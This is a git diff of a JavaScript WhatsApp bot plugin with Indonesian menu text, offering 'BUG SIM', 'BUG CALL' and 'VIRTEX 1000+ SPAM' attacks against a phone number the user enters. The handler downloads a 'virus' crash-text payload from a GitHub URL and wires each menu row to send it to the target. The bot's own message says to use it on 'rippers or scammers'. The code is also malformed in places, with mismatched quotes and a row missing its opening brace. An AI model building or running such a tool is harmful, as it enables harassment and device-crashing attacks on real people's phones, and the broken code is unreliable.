@@ -4,7 +4,7 @@ import { sticker } from '../lib/sticker.js'
 
 const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nHATI-HATI OWNER❗ Jangan di gunakan dengan sembarangan, karena fitur ini sangat berbahaya jangan anda mencoba memakai nomor hp anda disebabkan nomor anda diteror, nomor SIM anda akan mendapatkan *TERORAN ERROR* yang sangat tragis dan menyebabkan down atau disebut riset SIM. *GUNAKAN UNTUK RIPPER ATAU SCAMER!*. Terimakasih telah Membaca Owner WannTrue BOT',
+	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\n*GUNAKAN UNTUK RIPPER ATAU SCAMER!*',
  `)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
@@ -17,17 +17,17 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	let sections = [{
 		title: ' MENU BUG EKSTRIMS 💀',
 rows: [
-{ title: '😈⛓BUG SIM SIMPATI𝒇̶᭄࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG SIM TELKOMSEL𝒄̶̶̶᭄࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG SIM TRI𝒏̶᭄࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG SIM INDOSAT𝒌̶᭄࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG SIM SMARTFREN𝒈̶᭄࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG CALL SIMPATI𝒐̶᭄࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG CALL TRI࿐ꪶ😈', rowId: ".unban"` },
-{ title: '😈⛓BUG CALL TELKOMSEL࿐ꪶ😈',rowId: ".unban"` },
-{ title: '😈⛓BUG CALL INDOSAT࿐ꪶ😈', rowId: ".unban"` }, 
-{ title: '😈⛓BUG CALL SMARTFREN࿐ꪶ😈', rowId: ".unban"` },        
-{ title: '😈⛓BUG VIRTEX 1000+ SPAM࿐ꪶ😈', rowId: ".unban"` },]}]
+{ title: '😈⛓BUG SIM SIMPATI𝒇̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG SIM TELKOMSEL𝒄̶̶̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG SIM TRI𝒏̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG SIM INDOSAT𝒌̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG SIM SMARTFREN𝒈̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG CALL SIMPATI𝒐̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+ title: '😈⛓BUG CALL TRI࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG CALL TELKOMSEL𝒉̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },
+{ title: '😈⛓BUG CALL INDOSAT𝒌̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` }, 
+{ title: '😈⛓BUG CALL SMARTFREN𝒄̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },        
+{ title: '😈⛓BUG VIRTEX 1000+ SPAM𝒉̶᭄࿐ꪶ😈', rowId: `${_p}${command} vn ${text}` },]}]
     let listMessage = {
       text: 'HATI-HATI OWNER❗ Jangan di gunakan dengan sembarangan, karena fitur ini sangat berbahaya jangan anda mencoba memakai nomor hp anda disebabkan nomor anda diteror, nomor SIM anda akan mendapatkan *TERORAN ERROR* yang sangat tragis dan menyebabkan down atau disebut riset SIM. *GUNAKAN UNTUK RIPPER ATAU SCAMER!*. Terimakasih telah Membaca Owner WannTrue BOT',
       footer: '*➳😈⛓⚔w̆̈e̶ WannTrue࿐ꪶ😈',
